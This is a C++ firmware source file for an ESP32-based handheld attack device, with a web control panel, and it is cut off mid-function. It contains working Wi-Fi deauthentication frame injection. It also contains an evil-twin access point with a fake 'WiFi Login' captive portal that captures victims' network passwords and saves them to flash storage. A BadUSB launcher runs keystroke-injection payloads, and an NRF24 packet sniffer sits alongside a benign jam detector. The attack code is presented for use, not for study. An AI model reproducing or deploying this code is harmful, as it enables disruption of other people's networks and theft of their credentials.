// ─────────────────────────────────────────────────────────────
//  remote_ctrl.cpp — Headless web-UI management module  v3
//
//  Management AP: ZILLASTICK-CTRL / zillastick1 / 192.168.6.1
//
//  SCAN FIX: uses WIFI_AP_STA during scan so the management AP
//  stays alive and the user never gets kicked off.
//
//  SERVER FIX: AsyncWebServer is destroyed then recreated after
//  every attack so the TCP socket always binds cleanly.
//
//  Panel tabs:
//    WiFi   — scan · deauth · evil twin
//    Sub-GHz— 433 MHz RSSI poll + capture file list
//    BadUSB — list /payloads/ · trigger by path
//    Files  — browse /captures/ · view text files
//    NRF24  — channel scan · packet sniffer · jam detect
//
//  NRF24 tasks run independent of WiFi (use SPI, not WiFi radio).
//  The management AP stays up while NRF tasks are active.
//  Do NOT poll /api/rf/rssi while NRF is running — both share SPI.
// ─────────────────────────────────────────────────────────────

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include "esp_wifi.h"

#include "../../globals.h"
#include "../../core/display.h"
#include "../rf/rf_cc1101.h"
#include "../badusb/badusb.h"
#include "../nrf24/nrf24_module.h"
#include "remote_ctrl.h"

extern "C" {
    esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx,
                                const void* buffer, int len,
                                bool en_sys_seq);
}

// ── Management AP credentials ────────────────────────────────
#define MGMT_SSID  "ZILLASTICK-CTRL"
#define MGMT_PASS  "zillastick1"
#define MGMT_CH    6

// ── WiFi state machine ───────────────────────────────────────
enum RcState { RC_IDLE, RC_SCANNING, RC_DEAUTH, RC_ET, RC_BADUSB };
static volatile RcState s_rc        = RC_IDLE;
static String           s_rc_msg    = "Ready";
static volatile bool    s_task_run  = false;
static volatile bool    s_atk_done  = false;
static TaskHandle_t     s_task_h    = nullptr;
static int              s_atk_idx   = 0;
static int              s_atk_secs  = 30;
static char             s_badusb_path[128] = {0};

// ── Scanned WiFi networks ─────────────────────────────────────
struct RcNet {
    char    ssid[33];
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
};
static RcNet s_nets[30];
static int   s_net_cnt = 0;

// ── Captured credentials (evil twin) ─────────────────────────
static String s_creds    = "";
static String s_cap_pass = "";

// ── Web server ────────────────────────────────────────────────
static AsyncWebServer* s_srv = nullptr;

// ── ET captive portal (separate instance, port 80) ───────────
static AsyncWebServer* s_et_srv = nullptr;

// ── NRF24 headless state ──────────────────────────────────────
#define NRF_PKT_BUF  20    // sniffer ring buffer depth

enum NrfMode { NRF_IDLE, NRF_SCAN, NRF_SNIFF, NRF_JAMDET };

static volatile NrfMode  s_nrf_mode     = NRF_IDLE;
static volatile bool     s_nrf_task_run = false;
static TaskHandle_t      s_nrf_task_h   = nullptr;

// Channel scan
static uint8_t           s_nrf_ch_power[NRF_CH_COUNT] = {0};
static volatile uint32_t s_nrf_sweep_cnt = 0;

// Sniffer ring buffer
struct NrfPkt { uint8_t data[32]; uint8_t ch; uint8_t rate_idx; };
static NrfPkt            s_nrf_pkts[NRF_PKT_BUF];
static volatile uint8_t  s_nrf_pkt_head  = 0;
static volatile uint8_t  s_nrf_pkt_tail  = 0;
static volatile uint32_t s_nrf_pkt_total = 0;
static uint8_t           s_nrf_sniff_rate = 0;  // 0=1M 1=250K 2=2M

// Jam detect
#define NRF_HL_WARN   5
#define NRF_HL_ALARM  20
static volatile uint32_t s_nrf_hot      = 0;
static volatile uint32_t s_nrf_max_hot  = 0;
static volatile uint32_t s_nrf_sweeps   = 0;
static volatile bool     s_nrf_warn     = false;
static volatile bool     s_nrf_alarm    = false;

// ─────────────────────────────────────────────────────────────
//  Management panel HTML — tabbed, dark red theme
// ─────────────────────────────────────────────────────────────
static const char RC_HTML[] PROGMEM = R"html(<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZILLASTICK Ctrl</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0c0000;color:#fff;font-family:monospace;padding:10px;font-size:14px}
h1{color:#dc0000;margin-bottom:8px;font-size:17px}
.tabs{display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap}
.tab{background:#1a0000;border:1px solid #3a0000;border-radius:4px;padding:6px 10px;cursor:pointer;font-size:13px;color:#aaa}
.tab.active{background:#dc0000;color:#fff;border-color:#dc0000}
.page{display:none}.page.active{display:block}
.card{background:#180000;border:1px solid #3a0000;border-radius:6px;padding:10px;margin:6px 0}
.lbl{color:#dc0000;font-weight:bold;display:block;margin-bottom:6px}
button{background:#dc0000;color:#fff;border:none;padding:7px 13px;border-radius:4px;
       cursor:pointer;font-family:monospace;font-size:13px;margin:2px}
button.scan{background:#2a1000}
button.stop{background:#ff2828}
button.run{background:#006030}
button:active{opacity:.75}
select{background:#180000;color:#fff;border:1px solid #580000;padding:6px;border-radius:4px;
       width:100%;font-family:monospace;font-size:13px;margin-top:6px}
input[type=number]{background:#180000;color:#fff;border:1px solid #580000;padding:5px;
                   border-radius:4px;width:64px;font-family:monospace;font-size:13px}
#st{color:#ffc800;font-size:12px;margin-top:4px}
.note{color:#555;font-size:11px;margin-top:6px}
.ok{color:#00c850}.warn{color:#ffc800}.err{color:#ff4444}
table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
th{color:#dc0000;text-align:left;padding:3px 4px;border-bottom:1px solid #300000}
td{padding:3px 4px;border-bottom:1px solid #1a0000;word-break:break-all}
pre{background:#110000;padding:8px;border-radius:4px;overflow-x:auto;font-size:11px;
    white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto}
.stabs{display:flex;gap:3px;margin-bottom:6px;flex-wrap:wrap}
.stab{background:#1a0000;border:1px solid #2a0000;border-radius:3px;padding:4px 8px;
      cursor:pointer;font-size:12px;color:#888}
.stab.active{background:#580000;color:#fff;border-color:#580000}
</style>
</head><body>
<h1>&#9760; ZILLASTICK Ctrl</h1>

<div class="tabs">
  <div class="tab active" onclick="show('wifi')">&#128246; WiFi</div>
  <div class="tab" onclick="show('rf')">&#128137; Sub-GHz</div>
  <div class="tab" onclick="show('badusb')">&#9000; BadUSB</div>
  <div class="tab" onclick="show('files')">&#128193; Files</div>
  <div class="tab" onclick="show('nrf')">&#128261; NRF24</div>
</div>

<!-- STATUS (always visible) -->
<div class="card">
  <div id="st">Connecting...</div>
</div>

<!-- ── WiFi tab ─────────────────────────────────────────────── -->
<div id="pg-wifi" class="page active">
  <div class="card">
    <span class="lbl">Networks</span>
    <button class="scan" onclick="doScan()">Scan (AP stays up)</button>
    <select id="nets" size="5"><option value="">-- press Scan --</option></select>
  </div>
  <div class="card">
    <span class="lbl">Attack</span>
    Duration: <input type="number" id="secs" value="30" min="5" max="300"> s
    <div style="margin-top:8px">
      <button onclick="doDeauth()">&#128163; Deauth</button>
      <button onclick="doET()">&#128126; Evil Twin</button>
      <button class="stop" onclick="doStop()">&#9632; Stop</button>
    </div>
    <p class="note">WiFi attacks take the AP offline — reconnect after they finish.</p>
  </div>
  <div class="card" id="cbox" style="display:none">
    <span class="lbl">Captured Passwords</span>
    <table><thead><tr><th>SSID</th><th>Password</th></tr></thead>
    <tbody id="ctbl"></tbody></table>
  </div>
</div>

<!-- ── Sub-GHz tab ──────────────────────────────────────────── -->
<div id="pg-rf" class="page">
  <div class="card">
    <span class="lbl">433 MHz Status</span>
    <div id="rf-rssi" class="warn">Loading...</div>
    <button class="scan" style="margin-top:8px" onclick="pollRF()">&#8635; Refresh RSSI</button>
  </div>
  <div class="card">
    <span class="lbl">Capture Files</span>
    <div id="rf-files">Loading...</div>
  </div>
  <p class="note" style="margin:6px">Full replay/TX from headless coming soon. Use on-device menu for now.</p>
</div>

<!-- ── BadUSB tab ───────────────────────────────────────────── -->
<div id="pg-badusb" class="page">
  <div class="card">
    <span class="lbl">Payloads &nbsp;<span style="color:#555;font-weight:normal">/payloads/</span></span>
    <select id="payloads" size="7"><option>Loading...</option></select>
    <div style="margin-top:8px">
      <button class="run" onclick="runPayload()">&#9654; Run</button>
      <button class="scan" onclick="loadPayloads()">&#8635; Refresh</button>
    </div>
    <p class="note">Add .txt files to /payloads/ via SPIFFS upload — no reflash needed.</p>
  </div>
  <div id="badusb-status" class="card" style="display:none">
    <span class="lbl">Last Run</span>
    <div id="badusb-msg"></div>
  </div>
</div>

<!-- ── Files tab ────────────────────────────────────────────── -->
<div id="pg-files" class="page">
  <div class="card">
    <span class="lbl">Captures</span>
    <select id="capfiles" size="6"><option>Loading...</option></select>
    <div style="margin-top:8px">
      <button class="scan" onclick="viewFile()">&#128065; View</button>
      <button onclick="loadCapFiles()">&#8635; Refresh</button>
    </div>
  </div>
  <div class="card" id="fview" style="display:none">
    <span class="lbl" id="fview-name">File</span>
    <pre id="fview-content"></pre>
  </div>
</div>

<!-- ── NRF24 tab ─────────────────────────────────────────────── -->
<div id="pg-nrf" class="page">
  <div class="stabs">
    <div class="stab active" id="st-scan"   onclick="nrfTab('scan',this)">&#128268; Scan</div>
    <div class="stab"        id="st-sniff"  onclick="nrfTab('sniff',this)">&#128250; Sniff</div>
    <div class="stab"        id="st-jamdet" onclick="nrfTab('jamdet',this)">&#9888; Jam Detect</div>
  </div>

  <!-- Channel Scan sub-page -->
  <div id="nrf-scan">
    <div class="card">
      <span class="lbl">2.4GHz Channel Scan (0–125)</span>
      <button class="run" onclick="startNrfScan()">&#9654; Start</button>
      <button class="stop" onclick="stopNrf()">&#9632; Stop</button>
      <div id="nrf-scan-info" class="note" style="margin-top:6px">Idle — press Start</div>
      <canvas id="nrf-canvas" width="320" height="90"
        style="width:100%;background:#110000;margin-top:8px;border-radius:4px;display:block"></canvas>
      <div class="note" style="margin-top:4px">Red = hot (&gt;100) &nbsp; Yellow = active (&gt;40) &nbsp; Dark = clear</div>
    </div>
  </div>

  <!-- Sniffer sub-page -->
  <div id="nrf-sniff" style="display:none">
    <div class="card">
      <span class="lbl">NRF24 Packet Sniffer</span>
      <div style="margin-bottom:8px">
        Rate:
        <select id="sniff-rate" style="width:auto;display:inline-block;margin:0 6px">
          <option value="0">1 Mbps</option>
          <option value="1">250 Kbps</option>
          <option value="2">2 Mbps</option>
        </select>
      </div>
      <button class="run" onclick="startNrfSniff()">&#9654; Start</button>
      <button class="stop" onclick="stopNrf()">&#9632; Stop</button>
      <div id="nrf-sniff-info" class="note" style="margin-top:6px">Idle — auto-hops 2–125, sticky on hit</div>
      <table style="margin-top:8px">
        <thead><tr><th>Ch</th><th>Rate</th><th style="font-size:10px">First 16 bytes</th></tr></thead>
        <tbody id="nrf-sniff-tbl"></tbody>
      </table>
    </div>
  </div>

  <!-- Jam Detect sub-page -->
  <div id="nrf-jamdet" style="display:none">
    <div class="card">
      <span class="lbl">2.4GHz Jam Detect</span>
      <button class="run" onclick="startNrfJam()">&#9654; Start</button>
      <button class="stop" onclick="stopNrf()">&#9632; Stop</button>
      <div id="nrf-jam-info" class="note" style="margin-top:6px">Idle — press Start</div>
      <div style="background:#110000;border-radius:4px;height:18px;margin-top:10px;overflow:hidden">
        <div id="nrf-jam-bar" style="height:100%;width:0%;background:#00c850;transition:width 0.4s"></div>
      </div>
      <div id="nrf-jam-status" style="margin-top:8px;font-size:13px">--</div>
      <p class="note">Warn &gt;5 hot ch &nbsp;|&nbsp; Alarm &gt;20 hot ch &nbsp;|&nbsp; 2×150µs poll</p>
    </div>
  </div>
</div>

<script>
var nets=[];

// ── Tab switching ───────────────────────────────────────────
function show(name) {
  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
  event.target.classList.add('active');
  document.getElementById('pg-'+name).classList.add('active');
  if(name==='rf')    { pollRF(); loadRFFiles(); }
  if(name==='badusb'){ loadPayloads(); }
  if(name==='files') { loadCapFiles(); }
}

// ── NRF24 sub-tab switching ─────────────────────────────────
function nrfTab(name, el) {
  ['scan','sniff','jamdet'].forEach(function(n){
    document.getElementById('nrf-'+n).style.display = (n===name)?'':'none';
    document.getElementById('st-'+n).classList.toggle('active', n===name);
  });
}

// ── Status poll ─────────────────────────────────────────────
function poll(){
  fetch('/api/status').then(function(r){return r.json();}).then(function(d){
    var cls=d.state==='idle'?'ok':'warn';
    document.getElementById('st').innerHTML=
      '<span class="'+cls+'">'+d.state+'</span> — '+d.msg+
      (d.clients?' &nbsp;|&nbsp; Clients: '+d.clients:'')+
      (d.nrf?' &nbsp;|&nbsp; NRF:<span class="ok"> '+d.nrf+'</span>':'');
  }).catch(function(){
    document.getElementById('st').innerHTML='<span class="err">Reconnecting to AP...</span>';
  });
  fetch('/api/creds').then(function(r){return r.json();}).then(function(d){
    if(!d.length)return;
    document.getElementById('cbox').style.display='';
    var tb=document.getElementById('ctbl');
    tb.innerHTML='';
    d.forEach(function(c){
      var tr=document.createElement('tr');
      tr.innerHTML='<td>'+esc(c.ssid)+'</td><td>'+esc(c.pass)+'</td>';
      tb.appendChild(tr);
    });
  }).catch(function(){});
}
function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}

// ── WiFi scan ───────────────────────────────────────────────
function doScan(){
  var sel=document.getElementById('nets');
  sel.innerHTML='<option>Scanning — AP stays online...</option>';
  fetch('/api/scan',{method:'POST'}).then(function(){
    setTimeout(function(){
      fetch('/api/nets').then(function(r){return r.json();}).then(function(d){
        nets=d;
        sel.innerHTML='';
        if(!d.length){sel.innerHTML='<option>No networks found</option>';return;}
        d.forEach(function(n,i){
          var o=document.createElement('option');
          o.value=i;
          o.textContent=n.ssid+' ch'+n.ch+' ('+n.rssi+'dBm)';
          sel.appendChild(o);
        });
        sel.selectedIndex=0;
      });
    },6000);
  });
}
function idx(){var s=document.getElementById('nets');return s.value===''?0:parseInt(s.value);}
function secs(){return parseInt(document.getElementById('secs').value)||30;}
function doDeauth(){
  if(!nets.length){alert('Scan first');return;}
  fetch('/api/deauth',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({idx:idx(),secs:secs()})});
}
function doET(){
  if(!nets.length){alert('Scan first');return;}
  fetch('/api/et',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({idx:idx(),secs:secs()})});
}
function doStop(){fetch('/api/stop',{method:'POST'}).catch(function(){});}

// ── Sub-GHz ─────────────────────────────────────────────────
function pollRF(){
  fetch('/api/rf/rssi').then(function(r){return r.json();}).then(function(d){
    var col=d.rssi>-70?'err':d.rssi>-90?'warn':'ok';
    var note=d.note?' <span class="warn">('+d.note+')</span>':'';
    document.getElementById('rf-rssi').innerHTML=
      'CC1101: <span class="'+col+'">'+d.rssi+' dBm</span> @ 433 MHz '+
      (d.ready?'<span class="ok">READY</span>':'<span class="err">NOT FOUND</span>')+note;
  }).catch(function(){
    document.getElementById('rf-rssi').textContent='Error reading RSSI';
  });
}
function loadRFFiles(){
  fetch('/api/files?dir=/captures&ext=.rf').then(function(r){return r.json();}).then(function(d){
    var el=document.getElementById('rf-files');
    if(!d.length){el.textContent='No capture files yet.';return;}
    el.innerHTML='<table><tr><th>File</th><th>Size</th></tr>'+
      d.map(function(f){return '<tr><td>'+esc(f.name)+'</td><td>'+f.size+'B</td></tr>';}).join('')+
      '</table>';
  }).catch(function(){});
}

// ── BadUSB ──────────────────────────────────────────────────
function loadPayloads(){
  fetch('/api/files?dir=/payloads&ext=.txt').then(function(r){return r.json();}).then(function(d){
    var sel=document.getElementById('payloads');
    sel.innerHTML='';
    if(!d.length){sel.innerHTML='<option value="">No payload files in /payloads/</option>';return;}
    d.forEach(function(f){
      var o=document.createElement('option');
      o.value=f.path;
      o.textContent=f.name+' ('+f.size+'B)';
      sel.appendChild(o);
    });
    sel.selectedIndex=0;
  }).catch(function(){});
}
function runPayload(){
  var sel=document.getElementById('payloads');
  if(!sel.value)return;
  fetch('/api/badusb/run',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({path:sel.value})
  }).then(function(r){return r.json();}).then(function(d){
    document.getElementById('badusb-status').style.display='';
    document.getElementById('badusb-msg').textContent=d.msg;
  });
}

// ── File browser ─────────────────────────────────────────────
function loadCapFiles(){
  fetch('/api/files?dir=/captures&ext=.txt').then(function(r){return r.json();}).then(function(d){
    var sel=document.getElementById('capfiles');
    sel.innerHTML='';
    if(!d.length){sel.innerHTML='<option>No capture files</option>';return;}
    d.forEach(function(f){
      var o=document.createElement('option');
      o.value=f.path;
      o.textContent=f.name+' ('+f.size+'B)';
      sel.appendChild(o);
    });
  }).catch(function(){});
}
function viewFile(){
  var sel=document.getElementById('capfiles');
  if(!sel.value)return;
  fetch('/api/file?path='+encodeURIComponent(sel.value))
    .then(function(r){return r.text();}).then(function(txt){
      document.getElementById('fview').style.display='';
      document.getElementById('fview-name').textContent=sel.options[sel.selectedIndex].text;
      document.getElementById('fview-content').textContent=txt||'(empty)';
    });
}

// ── NRF24 ────────────────────────────────────────────────────
var nrfTimer = null;
var nrfRunning = '';

function _nrfClearTimer(){if(nrfTimer){clearInterval(nrfTimer);nrfTimer=null;}}

function startNrfScan(){
  _nrfClearTimer();
  fetch('/api/nrf/scan/start',{method:'POST'}).then(function(){
    nrfRunning='scan';
    document.getElementById('nrf-scan-info').textContent='Running...';
    nrfTimer=setInterval(pollNrfScan,600);
  }).catch(function(){document.getElementById('nrf-scan-info').textContent='Error starting scan';});
}

function pollNrfScan(){
  fetch('/api/nrf/scan/data').then(function(r){return r.json();}).then(function(d){
    document.getElementById('nrf-scan-info').textContent='Sweeps: '+d.sweeps;
    drawSpectrum(d.ch);
  }).catch(function(){});
}

function drawSpectrum(data){
  var c=document.getElementById('nrf-canvas');
  var ctx=c.getContext('2d');
  var w=c.width,h=c.height;
  ctx.fillStyle='#110000';ctx.fillRect(0,0,w,h);
  var bw=w/data.length;
  for(var i=0;i<data.length;i++){
    var v=data[i];
    if(v<1)continue;
    var bh=Math.max(1,Math.floor(v*h/255));
    ctx.fillStyle=v>100?'#ff4444':v>40?'#ffc800':'#dc0000';
    ctx.fillRect(i*bw,h-bh,Math.max(bw,1),bh);
  }
  // channel labels
  ctx.fillStyle='#333';ctx.font='9px monospace';
  for(var l=0;l<126;l+=25){ctx.fillText(l,l*bw,h-2);}
}

function startNrfSniff(){
  _nrfClearTimer();
  var rate=parseInt(document.getElementById('sniff-rate').value)||0;
  fetch('/api/nrf/sniff/start',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({rate:rate})
  }).then(function(){
    nrfRunning='sniff';
    document.getElementById('nrf-sniff-info').textContent='Running — auto-sweeping channels...';
    nrfTimer=setInterval(pollNrfSniff,800);
  }).catch(function(){document.getElementById('nrf-sniff-info').textContent='Error starting sniffer';});
}

function pollNrfSniff(){
  fetch('/api/nrf/sniff/pkts').then(function(r){return r.json();}).then(function(d){
    document.getElementById('nrf-sniff-info').textContent='Total packets: '+d.total;
    var tb=document.getElementById('nrf-sniff-tbl');
    tb.innerHTML='';
    var pkts=(d.pkts||[]).slice().reverse().slice(0,12);
    pkts.forEach(function(p){
      var tr=document.createElement('tr');
      tr.innerHTML='<td>'+p.ch+'</td><td>'+p.rate+'</td><td style="font-size:10px;font-family:monospace">'+p.hex+'</td>';
      tb.appendChild(tr);
    });
  }).catch(function(){});
}

function startNrfJam(){
  _nrfClearTimer();
  fetch('/api/nrf/jamdet/start',{method:'POST'}).then(function(){
    nrfRunning='jamdet';
    document.getElementById('nrf-jam-info').textContent='Running — sweeping 126 channels...';
    nrfTimer=setInterval(pollNrfJam,500);
  }).catch(function(){document.getElementById('nrf-jam-info').textContent='Error starting jam detect';});
}

function pollNrfJam(){
  fetch('/api/nrf/jamdet/status').then(function(r){return r.json();}).then(function(d){
    var pct=Math.round(d.hot*100/126);
    var bar=document.getElementById('nrf-jam-bar');
    bar.style.width=pct+'%';
    bar.style.background=d.alarm?'#ff4444':d.warn?'#ffc800':'#00c850';
    document.getElementById('nrf-jam-info').textContent=
      'Hot: '+d.hot+'/126  Peak: '+d.max_hot+'  Sweeps: '+d.sweeps;
    var st=document.getElementById('nrf-jam-status');
    if(d.alarm)      st.innerHTML='<span class="err" style="font-size:15px">&#9888; JAM DETECTED!</span>';
    else if(d.warn)  st.innerHTML='<span class="warn">&#9888; WARNING: Elevated 2.4GHz activity</span>';
    else             st.innerHTML='<span class="ok">&#10003; Normal — Spectrum clear</span>';
  }).catch(function(){});
}

function stopNrf(){
  _nrfClearTimer();
  nrfRunning='';
  fetch('/api/nrf/stop',{method:'POST'}).catch(function(){});
  document.getElementById('nrf-scan-info').textContent='Stopped';
  document.getElementById('nrf-sniff-info').textContent='Stopped';
  document.getElementById('nrf-jam-info').textContent='Stopped';
}

setInterval(poll,1500);
poll();
</script>
</body></html>)html";

// ─────────────────────────────────────────────────────────────
//  Evil twin captive portal HTML
// ─────────────────────────────────────────────────────────────
static const char ET_PORTAL_HTML[] PROGMEM = R"html(<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f4f4;display:flex;
     justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#fff;padding:28px 24px;border-radius:10px;
     box-shadow:0 4px 16px rgba(0,0,0,.15);max-width:360px;width:90%}
h2{margin:0 0 6px;font-size:20px;color:#333}
p{color:#666;font-size:14px;margin:0 0 16px}
input{width:100%;padding:11px;border:1px solid #ccc;border-radius:6px;
      font-size:16px;margin:6px 0 16px;box-sizing:border-box}
button{width:100%;padding:12px;background:#007aff;color:#fff;border:none;
       border-radius:6px;font-size:16px;cursor:pointer}
</style>
</head><body>
<div class="box">
  <h2>WiFi Login</h2>
  <p>Enter the password for <strong>%SSID%</strong> to continue.</p>
  <form action="/submit" method="post">
    <input type="password" name="pass" placeholder="Password" autofocus>
    <button type="submit">Connect</button>
  </form>
</div></body></html>)html";

static const char ET_OK_HTML[] PROGMEM = R"html(<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>body{font-family:Arial;text-align:center;padding:60px 20px;color:#333}
.check{font-size:64px;color:#28a745}</style></head>
<body><div class="check">&#10003;</div>
<h2>Connected</h2><p>You are now connected to the internet.</p>
</body></html>)html";

// ─────────────────────────────────────────────────────────────
//  Helpers
// ─────────────────────────────────────────────────────────────

static void _rc_deauth_burst(const uint8_t* bssid, int bursts) {
    uint8_t pkt[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    for (int b = 0; b < bursts; b++) {
        esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
        delay(5);
    }
}

static void _disp_status(const char* text, uint16_t colour = CLR_TEXT_DIM) {
    M5.Lcd.fillRect(0, CONTENT_Y + 54, DISP_W, 12, CLR_BG);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(colour, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 56);
    M5.Lcd.printf("%.36s", text);
}

// ─────────────────────────────────────────────────────────────
//  NRF24 headless FreeRTOS tasks
// ─────────────────────────────────────────────────────────────

static void _nrf_scan_task(void* arg) {
    if (!nrf24_headless_init()) {
        s_nrf_task_run = false;
        vTaskDelete(nullptr); return;
    }
    memset(s_nrf_ch_power, 0, sizeof(s_nrf_ch_power));
    s_nrf_sweep_cnt = 0;
    while (s_nrf_task_run) {
        nrf24_headless_scan_sweep(s_nrf_ch_power, NRF_CH_COUNT);
        s_nrf_sweep_cnt++;
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    nrf24_headless_deinit();
    vTaskDelete(nullptr);
}

static void _nrf_sniff_task(void* arg) {
    if (!nrf24_headless_init()) {
        s_nrf_task_run = false;
        vTaskDelete(nullptr); return;
    }
    nrf24_headless_sniff_init(s_nrf_sniff_rate);
    uint8_t  ch       = 2;
    uint32_t last_hop = millis();

    while (s_nrf_task_run) {
        uint32_t now = millis();
        // Auto-hop every 50 ms
        if (now - last_hop >= 50) {
            ch = (ch >= 125) ? 2 : ch + 1;
            nrf24_headless_sniff_set_ch(ch);
            last_hop = now;
        }
        uint8_t buf[32], pkt_ch;
        if (nrf24_headless_sniff_poll(buf, &pkt_ch)) {
            // Write to ring buffer (drop oldest if full)
            uint8_t next = (s_nrf_pkt_head + 1) % NRF_PKT_BUF;
            if (next == s_nrf_pkt_tail) {
                // full — advance tail to drop oldest
                s_nrf_pkt_tail = (s_nrf_pkt_tail + 1) % NRF_PKT_BUF;
            }
            memcpy(s_nrf_pkts[s_nrf_pkt_head].data, buf, 32);
            s_nrf_pkts[s_nrf_pkt_head].ch       = pkt_ch;
            s_nrf_pkts[s_nrf_pkt_head].rate_idx = s_nrf_sniff_rate;
            s_nrf_pkt_head = next;
            s_nrf_pkt_total++;
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
    nrf24_headless_deinit();
    vTaskDelete(nullptr);
}

static void _nrf_jamdet_task(void* arg) {
    if (!nrf24_headless_init()) {
        s_nrf_task_run = false;
        vTaskDelete(nullptr); return;
    }
    s_nrf_hot = s_nrf_max_hot = s_nrf_sweeps = 0;
    s_nrf_warn = s_nrf_alarm = false;

    while (s_nrf_task_run) {
        int hot = nrf24_headless_jamdet_sweep(150, 2);
        s_nrf_hot = (uint32_t)hot;
        s_nrf_sweeps++;
        if ((uint32_t)hot > s_nrf_max_hot) s_nrf_max_hot = (uint32_t)hot;
        s_nrf_warn  = (hot > NRF_HL_WARN  && hot <= NRF_HL_ALARM);
        s_nrf_alarm = (hot > NRF_HL_ALARM);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    nrf24_headless_deinit();
    vTaskDelete(nullptr);
}

// ─────────────────────────────────────────────────────────────
//  NRF24 task launcher helper
// ─────────────────────────────────────────────────────────────
static void _nrf_stop() {
    s_nrf_task_run = false;
    // Give task up to 500 ms to clean up (nrf24_headless_deinit)
    for (int i = 0; i < 50; i++) {
        if (!s_nrf_task_h) break;
        delay(10);
    }
    s_nrf_mode    = NRF_IDLE;
    s_nrf_task_h  = nullptr;
}

// ─────────────────────────────────────────────────────────────
//  WiFi FreeRTOS tasks
// ─────────────────────────────────────────────────────────────

static void _deauth_task(void* arg) {
    int idx = (int)(intptr_t)arg;
    uint32_t t_end = millis() + (uint32_t)s_atk_secs * 1000UL;
    while (millis() < t_end && s_task_run) {
        _rc_deauth_burst(s_nets[idx].bssid, 50);
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    s_task_run  = false;
    s_rc        = RC_IDLE;
    s_rc_msg    = "Deauth done — reconnect to " MGMT_SSID;
    s_atk_done  = true;
    vTaskDelete(nullptr);
}

static void _et_task(void* arg) {
    int idx        = (int)(intptr_t)arg;
    const char* ssid = s_nets[idx].ssid;
    uint8_t ch     = s_nets[idx].channel;

    WiFi.persistent(false);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    vTaskDelay(pdMS_TO_TICKS(150));
    WiFi.mode(WIFI_AP);
    vTaskDelay(pdMS_TO_TICKS(50));
    WiFi.softAP(ssid, "", ch, 0);
    vTaskDelay(pdMS_TO_TICKS(500));
    esp_wifi_set_max_tx_power(82);

    s_et_srv = new AsyncWebServer(80);

    s_et_srv->on("/", HTTP_GET, [ssid](AsyncWebServerRequest* req) {
        String html = String(FPSTR(ET_PORTAL_HTML));
        html.replace("%SSID%", ssid);
        req->send(200, "text/html", html);
    });
    s_et_srv->on("/submit", HTTP_POST, [](AsyncWebServerRequest* req) {
        if (req->hasParam("pass", true))
            s_cap_pass = req->getParam("pass", true)->value();
        req->send(200, "text/html", FPSTR(ET_OK_HTML));
    });
    s_et_srv->onNotFound([](AsyncWebServerRequest* req) {
        req->redirect("http://192.168.4.1/");
    });
    s_et_srv->begin();

    uint32_t t_end = millis() + (uint32_t)s_atk_secs * 1000UL;
    while (millis() < t_end && s_task_run) {
        if (s_cap_pass.length() > 0) {
            s_creds  += String("SSID:") + ssid + " PASS:" + s_cap_pass + "\n";
            s_rc_msg  = "Password captured!";
            if (SPIFFS.begin(false)) {
                File f = SPIFFS.open("/captures/remote_et.txt", "a");
                if (f) { f.printf("SSID:%s PASS:%s\n", ssid, s_cap_pass.c_str()); f.close(); }
            }
            s_cap_pass = "";
        }
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    s_et_srv->end();
    delete s_et_srv;
    s_et_srv = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    vTaskDelay(pdMS_TO_TICKS(150));

    s_task_run  = false;
    s_rc        = RC_IDLE;
    if (s_rc_msg != "Password captured!")
        s_rc_msg = "ET done — reconnect to " MGMT_SSID;
    s_atk_done  = true;
    vTaskDelete(nullptr);
}

static void _badusb_task(void* arg) {
    s_rc_msg = String("Running: ") + s_badusb_path;
    badusb_run_script(s_badusb_path);
    s_rc_msg   = String("Done: ") + s_badusb_path;
    s_task_run = false;
    s_rc       = RC_IDLE;
    s_atk_done = true;
    vTaskDelete(nullptr);
}

// ─────────────────────────────────────────────────────────────
//  SPIFFS file listing helper → JSON array
// ─────────────────────────────────────────────────────────────
static String _list_files(const char* dir, const char* ext) {
    String j = "[";
    bool first = true;
    if (!SPIFFS.begin(false)) return j + "]";
    File root = SPIFFS.open(dir);
    if (!root || !root.isDirectory()) return j + "]";
    File f = root.openNextFile();
    while (f) {
        String name = String(f.name());
        String base = name;
        int sl = name.lastIndexOf('/');
        if (sl >= 0) base = name.substring(sl + 1);
        if (String(ext).length() == 0 || base.endsWith(ext)) {
            if (!first) j += ",";
            j += "{\"name\":\"" + base + "\",\"path\":\"" + name +
